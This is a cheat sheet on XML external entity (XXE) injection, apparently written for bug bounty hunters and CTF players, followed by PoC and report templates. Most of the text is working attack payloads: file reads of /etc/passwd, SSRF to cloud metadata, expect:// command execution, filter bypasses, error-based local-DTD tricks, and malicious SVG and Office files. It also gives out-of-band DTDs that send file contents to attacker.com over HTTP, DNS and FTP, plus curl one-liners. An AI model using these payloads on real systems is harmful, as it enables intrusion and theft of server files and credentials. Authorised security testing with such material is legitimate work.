

# 🎯 XXE Injection CHEAT SHEET 

---

## 📍 PART 1: WHERE TO FIND XXE? (Attack Surfaces)

```
🔍 Look for these places:

1️⃣ API Endpoints
   • Content-Type: application/xml
   • Content-Type: text/xml
   • SOAP endpoints (<soap:Envelope>)
   • Try changing JSON → XML:
     Content-Type: application/json  →  application/xml

2️⃣ File Upload Features
   • .svg files (XML-based images)
   • .docx, .xlsx, .pptx (Office Open XML)
   • .odt, .ods (OpenDocument)
   • .xml, .xslt, .plist files
   • RSS/Atom feed importers

3️⃣ URL/Link Input Fields
   • "Import RSS feed"
   • "Fetch from URL"
   • Webhook testers
   • PDF generators that fetch URLs

4️⃣ Hidden XML Processing
   • App accepts JSON but converts to XML internally
   • Libraries: XmlDocument, XmlReader, libxml2, lxml, Apache Batik
   • Check headers: Server, X-Powered-By, error messages

💡 Rule: Any input that gets parsed as XML = XXE candidate
```

---

## 🔍 PART 2: HOW TO DETECT XXE? 

### ✅ Step 1: Confirm XML Acceptance

```http
POST /api/test HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?><root>test</root>
```
→ If you get 200 OK or XML parsing error → XML accepted ✅

### ✅ Step 2: Basic Detection Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "XXE_FOUND">]>
<root>&xxe;</root>
```
🔍 Check response:
- `XXE_FOUND` appears → Vulnerable ✅
- XML error → Parser works, maybe protected
- No change → Try Blind XXE

### ✅ Step 3: Blind XXE Test (No Output in Response)

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net">
]>
<root>&xxe;</root>
```
📡 Check Burp Collaborator / Interactsh:
- DNS or HTTP request received → Vulnerable ✅

### ✅ Step 4: Identify Backend Technology
| Error Message / Header | Likely Tech | Useful Wrapper |
|----------------------|-------------|---------------|
| `simplexml_load_string` | PHP | `php://filter/convert.base64-encode` |
| `XmlDocument`, `XmlReader` | .NET | `file:///`, `jar:` |
| `SAXParser`, `DocumentBuilder` | Java | `file:///`, `jar:`, `netdoc:` |
| `libxml2`, `lxml` | Python/C | `file:///`, `expect://` |

---

## ⚡ PART 3: QUICK PAYLOADS 

### 🔹 Basic File Read

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 🔹 Read /etc/hostname (CTF Favorite)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>
```

### 🔹 Windows Files

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>
```

### 🔹 PHP Wrapper (Base64 Encode Output)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

### 🔹 SSRF - Internal Network

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]>
<root>&xxe;</root>
```

### 🔹 SSRF - AWS Metadata

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

### 🔹 Blind XXE - HTTP Callback

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.net">]>
<root>&xxe;</root>
```

### 🔹 Blind XXE - Parameter Entity

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.net"> %xxe;]>
<root/>
```

### 🔹 XInclude (When DOCTYPE is blocked)

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### 🔹 SVG File Upload Payload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="10" y="30">&xxe;</text>
</svg>
```

---

## 🚀 PART 4: ADVANCED PAYLOADS

### 🔹 Read Multiple Files

```xml
<!DOCTYPE foo [
  <!ENTITY % f1 SYSTEM "file:///etc/passwd">
  <!ENTITY % f2 SYSTEM "file:///etc/hostname">
  <!ENTITY % combined "PASS:%f1;|HOST:%f2;">
]>
<root>&combined;</root>
```

### 🔹 PHP expect:// Command Execution (if enabled)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

### 🔹 Gopher Protocol for Raw TCP (Redis, Memcached)

```xml
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">
```

### 🔹 Jar Protocol for Java (Load DTD from ZIP)

```xml
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/payload.dtd">
```

### 🔹 Data:// with Base64 (Bypass Firewall)

```xml
<!DOCTYPE test [
  <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
  %init;
]>
<foo/>
```
> `ZmlsZTovLy9ldGMvcGFzc3dk` = `file:///etc/passwd`

---

## 🛡️ PART 5: BYPASS TECHNIQUES 

### 🔹 Use PUBLIC instead of SYSTEM

```xml
<!ENTITY xxe PUBLIC "any-text" "file:///etc/passwd">
```

### 🔹 Encode Special Characters

```xml
<!-- Encode : as &#x3a; and / as &#x2f; -->
<!ENTITY xxe SYSTEM "file&#x3a;&#x2f;&#x2f;&#x2f;etc&#x2f;passwd">
```

### 🔹 Break CDATA Sections

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
<email>&joined;</email>
```

### 🔹 External DTD for CDATA Bypass
**Main Request:**
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "https://attacker.com/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

**xxe.dtd (on your server):**
```xml
<!ENTITY joined "&begin;&file;&end;">
```

### 🔹 Bypass Tag Name Filters

```xml
<!DOCTYPE:. SYSTEM "http://attacker.com/evil.dtd">
<:.>&x;</:.>

<!DOCTYPE:_-_: SYSTEM "http://attacker.com/evil.dtd">
<:_-_:>&x;</:_-_:>
```

### 🔹 Bypass Parentheses () Restrictions

```xml
<!-- Use hex encoding for quotes -->
<!ENTITY xxe SYSTEM &#x22;file:///etc/passwd&#x22;>

<!-- Or use entity for quotes -->
<!ENTITY quote "&#x22;">
<!ENTITY xxe SYSTEM &quote;file:///etc/passwd&quote;>
```

---

## 🕵️ PART 6: BLIND XXE - DATA EXFILTRATION

### 🔹 Basic OOB with External DTD
**Main Payload:**
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root/>
```

**evil.dtd (on your server):**
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%send;
```

### 🔹 DNS Exfiltration (When HTTP Blocked)
**evil.dtd:**
```xml
<!ENTITY % payload SYSTEM "file:///etc/hostname">
<!ENTITY % exfil "<!ENTITY &#x25; dns SYSTEM 'http://%payload;.attacker.com/'>">
%exfil;
%dns;
```

### 🔹 FTP for Large Files
**evil.dtd:**
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; ftp SYSTEM 'ftp://attacker.com:2121/%data;'>">
%exfil;
%ftp;
```

---

## ⚠️ PART 7: ERROR-BASED XXE (No External Connection Needed)

### 🔹 Linux - Using docbookx.dtd

```xml
<!DOCTYPE message [
  <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///no/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local;
]>
<msg>trigger</msg>
```

### 🔹 Linux - Using fonts.dtd

```xml
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant '
    <!ENTITY &#x25; f SYSTEM "file:///flag">
    <!ENTITY &#x25; e "<!ENTITY &#x26;#x25; x SYSTEM &#x27;file:///err/&#x25;f;&#x27;>">
    &#x25;e;
    &#x25;x;
  '>
  %local;
]>
<foo/>
```

### 🔹 Windows - Using cim20.dtd

```xml
<!DOCTYPE doc [
  <!ENTITY % local SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; f SYSTEM "file://C:/flag.txt">
    <!ENTITY &#x25; e "<!ENTITY &#x26;#x25; x SYSTEM &#x27;file://err/#&#x25;f;&#x27;>">
    &#x25;e;
    &#x25;x;
  <!ENTITY t "t"'
  >
  %local;
]><x/>
```

> 🎯 Look for error message containing: `file:///no/root:x:0:0:root...` ← That's your data!

---

## 📎 PART 8: FILE UPLOAD XXE (SVG, DOCX, XLSX)

### 🔹 SVG Payload (Simple)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="10" y="30" font-size="14">&xxe;</text>
</svg>
```

### 🔹 DOCX Payload (Inside word/document.xml)

```xml
<!-- After unzipping .docx, edit word/document.xml -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
<!-- Then re-zip: zip -r ../poc.docx * -->
```

### 🔹 XLSX Payload (Inside xl/sharedStrings.xml)

```xml
<!DOCTYPE sst [<!ENTITY xxe SYSTEM "file:///flag">]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <si><t>&xxe;</t></si>
</sst>
```

### 🔹 SOAP with CDATA Bypass

```xml
<soap:Body>
  <data>
    <![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]]>
    <value>&xxe;</value>
    <![CDATA[]]>
  </data>
</soap:Body>
```

---

## 🛠️ PART 9: TOOLS

```
🔹 Burp Suite Professional
   • Collaborator for Blind XXE detection
   • Repeater for payload testing
   • Content Type Converter extension

🔹 XXEinjector (GitHub: enjoiz/XXEinjector)
   • Automated XXE exploitation
   • Supports OOB, direct, PHP filter methods
   • Command: xxeinjector --host=target --path=/api --file=req.txt --oob=http

🔹 dtd-finder (GitHub: GoSecure/dtd-finder)
   • Find local DTD files on target system
   • Generate payloads for error-based XXE
   • Command: java -jar dtd-finder.jar list

🔹 oxml_xxe (GitHub: BuffaloWill/oxml_xxe)
   • Embed XXE in DOCX/XLSX/SVG/PDF
   • Great for file upload testing

🔹 Interactsh (ProjectDiscovery)
   • Free alternative to Burp Collaborator
   • DNS/HTTP/SMB interactions
   • CLI: interactsh-client -s YOUR-SERVER

🔹 xxeftp / xxeserv (GitHub: staaldraad)
   • Mini FTP/HTTP server for receiving exfiltrated data
   • Useful for large file extraction via FTP
```

---

## 🧪 PART 10: POC TEMPLATE 

```
Title: XXE Injection in [Endpoint Name]

1. Endpoint:
   POST /api/price HTTP/1.1
   Host: target.com
   Content-Type: application/xml

2. Vulnerable Request:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<price><current_price>&xxe;</current_price></price>

3. Response:
{"price": "web-server-abc123", "status": "success"}
↑ "web-server-abc123" = content of /etc/hostname

4. Impact:
   - Attacker can read sensitive files on server
   - Potential SSRF to internal services
   - Cloud metadata exposure if on AWS/Azure/GCP

5. Steps to Reproduce:
   a. Send request above to /api/price
   b. Observe hostname in JSON response
   c. Replace /etc/hostname with other files to confirm

6. Remediation:
   - Disable external entities: 
     • PHP: libxml_disable_entity_loader(true)
     • Java: dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
     • .NET: xmlSettings.DtdProcessing = DtdProcessing.Prohibit
   - Validate input Content-Type
   - Don't expose parser errors to users
```

---

## 📝 PART 11: BUG BOUNTY REPORT TEMPLATE

```markdown
# XXE Injection - [Brief Description]

## Summary
The application processes user-supplied XML without disabling external entity resolution, allowing attackers to read local files, perform SSRF, or exfiltrate data.

## Steps to Reproduce
1. Navigate to [URL]
2. Intercept request in Burp Suite
3. Change Content-Type to application/xml
4. Send payload:

[PASTE PAYLOAD HERE]

5. Observe [SENSITIVE DATA] in response/Collaborator

## Proof of Concept
```

**Request:**
```http
[PASTE FULL REQUEST]
```

**Response:**
```
[PASTE RESPONSE OR COLLABORATOR LOG]
```

**Screenshot:** [Attach if helpful]

## Impact
- ✅ Read sensitive files: /etc/passwd, config files, source code
- ✅ SSRF to internal services or cloud metadata
- ✅ Potential DoS via entity expansion
- Risk Level: [High/Medium]

## Remediation
1. Disable external entity processing in XML parser:
   - PHP: `libxml_disable_entity_loader(true)`
   - Java: `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - .NET: `xmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`
2. Validate and whitelist expected input formats
3. Suppress detailed XML parser errors in production
4. Update XML processing libraries to latest secure versions

## References
- OWASP XXE Prevention Cheat Sheet
- PortSwigger XXE Labs
- CWE-611: XML External Entity (XXE)

---

## 🎯 FINAL CHECKLIST - Before You Submit

```
[ ] Tested basic XXE payload: &xxe; with "DETECTED"
[ ] Confirmed XML parsing: Changed Content-Type, got XML error
[ ] Tried file read: /etc/passwd, /etc/hostname, win.ini
[ ] Tested Blind XXE: Collaborator/Interactsh received request
[ ] Tried bypasses: PUBLIC, encoding, CDATA, XInclude
[ ] Tested file upload: SVG with &entity; in <text>
[ ] Checked for error-based: Local DTD redefinition
[ ] Documented: Request, Response, Steps, Impact
[ ] Used safe files for PoC: /etc/hostname, not /etc/shadow
[ ] Included remediation: Parser hardening suggestions
```

---

## 🚀 QUICK REFERENCE - One-Liners

```bash
# Basic XXE Test
echo '<?xml version="1.0"?><!DOCTYPE t[<!ENTITY x "FOUND">]><r>&x;</r>' | curl -X POST -H "Content-Type: application/xml" -d @- https://target/api

# Blind XXE Test (with Collaborator)
echo '<?xml version="1.0"?><!DOCTYPE t[<!ENTITY x SYSTEM "http://ABC.burpcollaborator.net">]><r>&x;</r>' | curl -X POST -H "Content-Type: application/xml" -d @- https://target/api

# SVG XXE Upload (save as exploit.svg)
cat > exploit.svg << 'EOF'
<?xml version="1.0" standalone="yes"?><!DOCTYPE s[<!ENTITY x SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
EOF

# PHP Wrapper for Base64 Output
echo '<?xml version="1.0"?><!DOCTYPE t[<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>' | curl -X POST -H "Content-Type: application/xml" -d @- https://target/api
```

---
